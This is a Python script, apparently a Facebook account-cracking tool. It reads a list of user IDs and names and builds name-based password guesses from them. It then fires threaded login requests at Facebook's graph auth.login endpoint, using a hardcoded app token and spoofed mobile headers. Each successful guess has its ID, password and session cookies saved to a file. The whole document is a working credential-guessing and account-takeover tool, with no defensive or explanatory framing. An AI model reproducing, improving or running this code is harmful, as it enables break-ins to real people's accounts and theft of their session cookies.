import os,json,time,uuid,sys,random,base64,shutil,re, requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool

line="—"*30
limit=50
logo="""
    ┏┳┓┏┓┏┓┏┳┓
     ┃ ┣ ┗┓ ┃ 
     ┻ ┗┛┗┛ ┻"""
def rn():
    pwx=['0987654','first2233','22558800','304050','first12','first@12345','first112233','@1234@','@123456@','first2233','77889900','44332211','first25','000999','123412','first2025','firstlast123','first123']
    os.system("clear")
    print(logo)
    print(line)
    try:
        print(" Example /sdcard/id.txt")
        user=open(input(" # file_path: "),"r").read().splitlines()
    except:
        rn()
    limit=len(user)
    print(line)
    
    with ThreadPool(max_workers=30) as heron:
        os.system("clear")
        print(logo)
        print(line)
        ua=input(" Inject Ua ~> ")
        os.system("clear")
        device=ua.split("FBBD/")[1].split(";")[0].upper()
        os.system("clear")
        print(logo)
        print(line)
        print(" Total Id "+str(limit)+"| Pas"+str(len(pwx)))
        print(" Ua Device ~> "+device)
        print(line)
        
        for xd in user:
            uid,names=xd.split("|")
            heron.submit(test_1,uid,names,pwx,ua)
            

loop=0
oks=[]


def test_1(uid,names,pwx,ua):
    global loop,oks,limit
    
    sys.stdout.write(f'\r  \033[1;37m~/ [SAVAGE\033[1;37m] \033[1;37m<[\033[1;1m{loop}\033[1;00m\033[1;37m]> <[\033[1;37m\033[1;1m\033[1;32m{str(len(oks))}\033[1;00m\033[1;37m]>\033[0;00m\r');sys.stdout.flush()
    
    try:
        for pw in pwx:
            f1,l1=names.split(" ")
            ps=pw.replace("first",f1.lower()).replace("First",f1).replace("FIRST",f1.upper()).replace("last",l1.lower()).replace("LAST",l1.upper()).replace("Last",l1).replace("name",names.lower()).replace("Name",names)
            add_ua=f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'
            data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": uid,
            "password": "#PWD_REACTNATIVE:0:{}:{}".format(str(time.time()).split('.')[0], ps),
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_US",
            "client_country_code": "US",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            head = {
            "User-Agent": add_ua+ua,
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "graph.facebook.com",
            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
            "X-FB-Connection-Type": "MOBILE.LTE",
            "X-Tigon-Is-Retry": "False",
            "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
            "x-fb-device-group": "5120",
            "X-FB-Friendly-Name": "ViewerReactionsMutation",
            "X-FB-Request-Analytics-Tags": "graphservice",
            "X-FB-HTTP-Engine": "Liger",
            "X-FB-Client-IP": "True",
            "X-FB-Server-Cluster": "True",
            "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",}
            rq = requests.post('https://graph.facebook.com/auth/login',data=data, headers=head, allow_redirects=False).json()
            if "session_key" in rq:
                xd=uid
                coki=";".join(i["name"]+"="+i["value"] for i in rq["session_cookies"])
                print(f"\r\r [OK] {xd} | {ps}| {coki}")
                oks.append(xd)
                open("/sdcard/test-ok.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
                break
            else:
                continue
        loop+=1
    except Exception as e:
        #print(e)
        time.sleep(10)







rn()



